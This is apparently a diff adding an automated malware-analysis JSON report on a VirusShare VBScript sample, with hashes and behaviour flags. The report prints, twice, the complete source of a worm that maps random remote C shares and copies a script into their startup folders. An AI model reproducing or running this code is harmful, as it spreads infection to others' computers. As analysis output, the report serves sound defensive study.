@@ -1,0 +1,55 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "copyfile": "May copy a file",
+            "createobject": "May create an OLE object",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "set t=wscript.createobject(\"wscript.network\")\nset f=createobject(\"scripting.filesystemobject\")\non error resume next\nrandomize\nif (f.fileexists(\"c:\\network.vbs\")) then f.deletefile(\"c:\\network.vbs\")\nif (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\network.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\network.vbs\")\ndo\ndo while w=0\nn=\"\\\\24.\"&int(254*rnd+1)&\".\"&int(254*rnd+1)&\".\"&int(254*rnd+1)&\"\\C\"\nt.mapnetworkdrive \"x:\",n\nset o=t.enumnetworkdrives\nfor i=0 to o.Count-1\nif n=o.item(i) then w=1\nnext\nloop\nf.copyfile \"c:\\windows\\startm~1\\programs\\startup\\a24.vbs\", \"x:\\windows\\startm~1\\programs\\startup\\\"\nt.removenetworkdrive \"x:\"\nw=0\nloop\n'netlog.worm.remover.optimized\n'That's how the normal code should look like...\n'Greetings to BSRF."
+    },
+    "filename": "VirusShare_acb5557428e159419b337afd2b6da700",
+    "filesize": 781,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "acb5557428e159419b337afd2b6da700",
+        "sha1": "cddb8a2bbe6d95998d36541c4db6f7c8d32a9bb0",
+        "sha256": "105dcb247aee61aaac3da37d2574b09412ef25a649f28c86d27417f9d1c57f5b"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "set t=wscript.createobject(\"wscript.network\")",
+            "set f=createobject(\"scripting.filesystemobject\")",
+            "on error resume next",
+            "randomize",
+            "if (f.fileexists(\"c:\\network.vbs\")) then f.deletefile(\"c:\\network.vbs\")",
+            "if (f.fileexists(\"c:\\windows\\startm~1\\programs\\startup\\network.vbs\")) then f.deletefile(\"c:\\windows\\startm~1\\programs\\startup\\network.vbs\")",
+            "do while w=0",
+            "n=\"\\\\24.\"&int(254*rnd+1)&\".\"&int(254*rnd+1)&\".\"&int(254*rnd+1)&\"\\C\"",
+            "t.mapnetworkdrive \"x:\",n",
+            "set o=t.enumnetworkdrives",
+            "for i=0 to o.Count-1",
+            "if n=o.item(i) then w=1",
+            "next",
+            "loop",
+            "f.copyfile \"c:\\windows\\startm~1\\programs\\startup\\a24.vbs\", \"x:\\windows\\startm~1\\programs\\startup\\\"",
+            "t.removenetworkdrive \"x:\"",
+            "loop",
+            "'netlog.worm.remover.optimized",
+            "'That's how the normal code should look like...",
+            "'Greetings to BSRF."
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.274361",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
